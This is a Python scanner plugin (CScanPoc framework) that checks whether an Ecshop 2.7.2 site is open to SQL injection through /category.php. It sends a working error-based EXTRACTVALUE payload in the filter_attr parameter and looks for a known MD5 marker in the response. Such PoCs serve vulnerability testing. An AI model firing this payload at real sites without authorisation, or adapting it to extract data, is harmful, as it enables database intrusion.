# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0012'  # 平台漏洞编号，留空
    name = 'Ecshop 2.7.2 /category.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        Ecshop 商城系统category页面过滤不严导致SQL注入漏洞
    '''  # 漏洞描述
    ref = 'http://jingpin.jikexueyuan.com/article/15003.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = '2.72'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '02412d0f-e87a-44f4-92dd-80b587fe31be'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/category.php?page=1&sort=goods_id&order=ASC%23goods_list&category=1&display=grid&brand=0&price_min=0&price_max=0&filter_attr=-999%20AND%20EXTRACTVALUE(1218%2cCONCAT(0x5c%2c0x716f776c71%2c(MID((IFNULL(CAST(md5(3.1415)%20AS%20CHAR)%2c0x20))%2c1%2c50))%2c0x7172737471))"
            url = '{target}'.format(target=self.target)+payload
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
